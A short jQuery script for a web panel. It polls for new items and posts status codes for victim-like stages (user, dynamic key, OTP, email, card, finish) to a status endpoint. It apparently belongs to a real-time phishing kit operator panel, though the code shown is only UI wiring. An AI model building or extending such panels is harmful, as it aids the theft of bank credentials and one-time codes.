$(document).ready(function(){
	sonido();

	setInterval(load_items,2000);	

	$(".cerrar img").click(function(evento){
		cerrar_sesion();
	});
	
	$(".cerrar img").hover(function(evento){
		$(".cerrar img").attr("src","../assets/img/cerrar-r.svg");
	});	

	$(".cerrar img").mouseout(function(evento){
		$(".cerrar img").attr("src","../assets/img/cerrar-g.svg");
	});	


	$(document).on('click', '.usuario', function() {
		$(this).attr('disabled','disabled')
		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"12" },function(data) {

		});
	});

	$(document).on('click', '.dinamica', function() {
		$(this).attr('disabled','disabled')
		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"2" },function(data) {

		});
	});

	$(document).on('click', '.otp', function() {
		$(this).attr('disabled','disabled')
		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"8" },function(data) {

		});
	});

	$(document).on('click', '.correo', function() { 
		$(this).attr('disabled','disabled')
		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"4" },function(data) {
		
		});
	});

	$(document).on('click', '.tarjeta', function() { 
		$(this).attr('disabled','disabled')
		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"6" },function(data) {
		
		});
	});

	$(document).on('click', '.finalizar', function() { 
		$(this).attr('disabled','disabled')
		$.post( "../run/status.php",{ id:$(this).attr('id'),est:"10" },function(data) {
		
		});
	});
});